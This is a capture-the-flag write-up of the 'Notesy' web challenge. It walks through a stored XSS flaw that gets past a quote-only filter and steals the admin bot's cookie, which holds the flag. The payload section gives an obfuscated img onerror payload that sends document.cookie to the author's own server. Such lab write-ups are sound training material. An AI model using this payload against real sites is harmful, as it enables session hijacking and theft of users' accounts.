---
layout: ctf-layout
title: Notesy
permalink: /writeups/web/notesy
comments: false
---
<p align="center">
  <img src="https://i.imgflip.com/978447.jpg" title="IOI SaveData" width="90%" />
</p>

##### Difficulty: <b>Hard</b> 

##### Description:
You’ve been hired by a tech company to review their new note-taking app, "Notesy." The app allows users to create and manage notes with a focus on security. Your role is to assess the application for any potential vulnerabilities to ensure user data is well protected.

##### Challenge: 
These web challenges from the Fall Huddle were easier than usual, especially this one. I wouldn’t call it hard at all. It’s a simple stored XSS vulnerability that we exploit to steal the admin's cookie, which contains the flag. Payloads with single or double quotes are blocked, but we can bypass this by HTML encoding the quotes. Another minor issue we encountered was with using fetch(), but we worked around it by using an image request instead.

##### Vulnerable Code:
###### /app.py file:
The is_safe_content() function only checks for single (') and double (") quotes, but this is an insufficient filter, which we are able to bypass.
```python
if re.search(r'[\'"]', decoded_content, re.IGNORECASE):
    return False
```

##### Solution 
When navigating the application, we see that we can create notes and submit reports. The title and content parameters accept user input but only sanitize single and double quotes, making it trivial to get XSS payloads to execute. When we create a note, it is assigned a unique identifier. This is where the report feature becomes useful — we can submit these note URLs to the admin by providing the URL to the report. Looking at the source code, we notice that the flag is stored in the admin's cookie. Now, we just need to craft a payload that sends the cookie to our server. While fetch() didn't work, I switched to using an image request instead. This worked when I tested it with my own cookie.
<br>

##### Payload:
```javascript
<img src=x onerror=this.src=String.fromCharCode(104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,54,50,46,49,56,51,58,49,50,51,52)+&quot;/?cookie=&quot;+document.cookie>
```
<br>

Finally, I set up a Python server and submitted the note with the XSS payload to the admin. A few seconds later, I received the admin's cookie containing the flag.
##### The Flag: 

<p align="center">
  <img src="https://i.imgflip.com/9785t1.jpg" title="The Flag!!!" width="90%" />
</p>
